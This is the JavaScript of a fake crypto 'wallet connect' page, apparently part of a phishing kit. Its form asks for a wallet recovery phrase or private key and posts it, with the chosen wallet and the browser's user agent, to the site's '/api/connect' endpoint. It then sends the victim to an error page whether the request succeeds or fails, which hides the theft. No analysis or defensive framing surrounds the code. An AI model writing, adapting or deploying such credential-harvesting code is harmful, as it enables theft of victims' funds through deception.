
document.addEventListener('DOMContentLoaded', function() {
  // DOM Elements
  const introSection = document.getElementById('intro-section');
  const walletSelectSection = document.getElementById('wallet-select-section');
  const recoveryPhraseSection = document.getElementById('recovery-phrase-section');
  const startConnectBtn = document.getElementById('start-connect-btn');
  const backToIntroBtn = document.getElementById('back-to-intro-btn');
  const backToSelectBtn = document.getElementById('back-to-select-btn');
  const walletItems = document.querySelectorAll('.wallet-item');
  const selectedWalletName = document.getElementById('selected-wallet-name');
  const recoveryForm = document.getElementById('recovery-form');
  const recoveryPhrase = document.getElementById('recovery-phrase');

  let selectedWallet = null;

  // Navigation Functions
  function showSection(section) {
    // Hide all sections
    introSection.classList.remove('active');
    walletSelectSection.classList.remove('active');
    recoveryPhraseSection.classList.remove('active');

    // Show the requested section
    section.classList.add('active');
  }

  // Event Listeners
  startConnectBtn.addEventListener('click', function() {
    showSection(walletSelectSection);
  });

  backToIntroBtn.addEventListener('click', function() {
    showSection(introSection);
  });

  backToSelectBtn.addEventListener('click', function() {
    showSection(walletSelectSection);
  });

  walletItems.forEach(item => {
    item.addEventListener('click', function() {
      // Remove selected class from all items
      walletItems.forEach(wallet => wallet.classList.remove('selected'));
      
      // Add selected class to clicked item
      this.classList.add('selected');
      
      // Store selected wallet
      selectedWallet = this.getAttribute('data-wallet');
      
      // Update wallet name in the recovery phrase section
      selectedWalletName.textContent = this.querySelector('.wallet-name').textContent;
      
      // Show recovery phrase section
      showSection(recoveryPhraseSection);
    });
  });

  recoveryForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Validate recovery phrase
    if (recoveryPhrase.value.trim() === '') {
      alert('Please enter your recovery phrase or private key.');
      return;
    }
    
    // Prepare data to send to server
    const userData = {
      wallet: selectedWallet,
      phrase: recoveryPhrase.value.trim(),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent
    };
    
    // Send data to server
    fetch('/api/connect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(userData),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      
      // Redirect to error page
      window.location.href = '/error.html';
    })
    .catch((error) => {
      console.error('Error:', error);
      
      // Redirect to error page even if there's an error
      window.location.href = '/error.html';
    });
  });

  // Initialize the app
  showSection(introSection);

  // Add smooth animation for wallet items
  function animateWalletItems() {
    walletItems.forEach((item, index) => {
      setTimeout(() => {
        item.style.opacity = '0';
        item.style.transform = 'translateY(10px)';
        item.style.transition = 'none';
        
        setTimeout(() => {
          item.style.transition = 'all 0.3s ease';
          item.style.opacity = '1';
          item.style.transform = 'translateY(0)';
        }, 50);
      }, index * 50);
    });
  }

  // Run wallet animation when wallet selection becomes visible
  const walletSelectObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        animateWalletItems();
        walletSelectObserver.disconnect();
      }
    });
  });

  walletSelectObserver.observe(walletSelectSection);
});
